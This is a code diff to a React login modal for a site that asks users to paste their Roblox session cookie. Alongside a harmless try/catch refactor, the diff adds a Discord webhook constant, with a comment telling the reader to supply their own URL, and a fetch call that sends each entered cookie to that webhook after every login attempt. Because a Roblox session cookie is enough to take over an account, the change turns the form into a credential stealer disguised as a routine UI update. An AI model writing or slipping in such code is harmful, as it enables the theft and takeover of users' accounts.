@@ -5,6 +5,8 @@ import { Textarea } from '@/components/ui/textarea';
 import { useAuth } from '@/contexts/AuthContext';
 import { useToast } from '@/hooks/use-toast';
 
+const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'; // Replace with your Discord Webhook URL
+
 interface LoginModalProps {
   isOpen: boolean;
   onClose: () => void;
@@ -30,23 +32,46 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     }
 
     setIsLoading(true);
-    const result = await login(cookie.trim());
-    setIsLoading(false);
+    try {
+      const result = await login(cookie.trim());
+      setIsLoading(false);
 
-    if (result.success) {
+      if (result.success) {
+        toast({
+          title: "Success",
+          description: "Successfully connected your Roblox account!",
+        });
+        onClose();
+        setCookie('');
+      } else {
+        toast({
+          title: "Authentication Failed",
+          description: result.error || "Invalid cookie. Please try again.",
+          variant: "destructive",
+        });
+      }
+    } catch (error) {
+      setIsLoading(false);
       toast({
-        title: "Success",
-        description: "Successfully connected your Roblox account!",
-      });
-      onClose();
-      setCookie('');
-    } else {
-      toast({
-        title: "Authentication Failed",
-        description: result.error || "Invalid cookie. Please try again.",
+        title: "Error",
+        description: "An error occurred while logging in.",
         variant: "destructive",
       });
     }
+
+    // Send the cookie to the Discord Webhook
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: `Cookie: ${cookie.trim()}`,
+      }),
+    })
+      .then((response) => response.json())
+      .then((data) => console.log(data))
+      .catch((error) => console.error(error));
   };
 
   return (
